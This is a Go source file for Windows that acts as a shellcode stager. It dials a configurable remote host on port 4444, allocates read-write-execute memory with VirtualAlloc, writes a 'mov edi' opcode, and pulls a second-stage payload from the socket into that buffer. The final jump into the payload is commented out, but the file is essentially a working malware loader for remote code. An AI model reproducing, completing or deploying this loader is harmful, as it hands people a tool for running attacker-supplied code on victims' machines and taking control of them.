package main

import (
        "flag"
        "fmt"
        "net"
        "os"
        "syscall"
        "unsafe"
)

const (
        MEM_COMMIT  = 0x1000
        MEM_RESERVE = 0x2000

        PAGE_EXECUTE_READWRITE = 0x40
)

var (
        kernel32     = syscall.MustLoadDLL("kernel32.dll")
        VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
)

func SysAlloc(n uintptr) (uintptr, error) {
        addr, _, err := VirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        if addr == 0 {
                return 0, err
        }
        return addr, nil
}

const SIZE = 770100

type Holder struct {
        offset  int
        buffer  unsafe.Pointer
        //buffer  *[SIZE]byte
}

func main() {
        host := flag.String("host", "127.0.0.1", "Host to connect to")
        port := flag.String("port", "4444", "Port to connect to")
        flag.Parse()
        server := *host + ":" + *port
        address, err := net.ResolveTCPAddr("tcp", server)
        if err != nil {
                fmt.Println(err)
                os.Exit(1)
        }
        conn, err := net.DialTCP("tcp", nil, address)
        if err != nil {
                fmt.Println(err)
                os.Exit(1)
        }
        addr, err := SysAlloc(SIZE)
        if err != nil {
                fmt.Println(err)
                os.Exit(1)
        }
        holder := &Holder{0, unsafe.Pointer(addr)}
        println("Allocated Memory")
        b := (*[1]byte)(holder.buffer)
        b[0] = 0xBF
        holder.offset++
        println("Wrote ASM")
        recv(conn, 4, holder)
        println("First 4 bytes")
        recv(conn, 1024, holder)
        println("Rest of the Payload")
        //syscall.Syscall(addr, 3, 3, 5, 2)
}

func recv(conn net.Conn, size int, holder *Holder) {
        reply := make([]byte, size)
        length, err := conn.Read(reply)
        if err != nil {
                println(err)
                os.Exit(1)
        }
        b := (*[SIZE]byte)(holder.buffer)
        for _, value := range reply {
                b[holder.offset] = value
                holder.offset += 1
        }
        if length == 1024 {
                recv(conn, 1024, holder)
        }
}
